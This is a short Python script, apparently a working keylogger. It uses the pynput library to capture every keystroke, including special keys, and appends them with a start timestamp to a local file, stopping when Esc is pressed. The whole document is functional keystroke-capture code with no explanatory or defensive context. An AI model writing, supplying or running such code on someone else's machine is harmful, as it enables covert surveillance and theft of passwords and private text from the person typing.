from pynput import keyboard
from datetime import datetime

LOG_FILE = "keystrokes.txt"

def write_log(text):
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(text)

def on_press(key):
    try:
        if key.char is not None:
            write_log(key.char)
    except AttributeError:
        write_log(f"[{key.name}]")

def on_release(key):
    if key == keyboard.Key.esc:
        write_log("\n\n--- Logging stopped ---\n")
        return False

write_log(f"\n--- Logging started at {datetime.now()} ---\n")

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
